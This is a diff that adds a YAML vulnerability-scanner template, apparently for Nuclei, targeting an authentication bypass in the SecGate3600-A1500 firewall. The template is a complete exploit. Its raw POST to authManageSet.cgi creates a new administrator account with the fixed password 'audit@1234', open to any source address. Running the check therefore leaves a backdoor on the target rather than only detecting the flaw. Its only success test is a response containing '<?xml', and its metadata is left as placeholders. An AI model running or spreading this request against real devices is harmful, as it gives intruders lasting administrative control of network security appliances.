@@ -1,0 +1,31 @@
+id: SecGate3600-authManageSet-useradd
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 网神SecGate3600-A1500会话鉴权逻辑存在问题导致，登录绕过获取管理员权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%BD%91%E7%A5%9ESecGate3600%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  username: "{{rand_base(6)}}"  
+http:
+  - raw:
+      - |-
+        POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept: application/xml, text/xml, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 91
+        Connection: close
+
+        type=saveAdmin&id=2&userName={{username}}&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
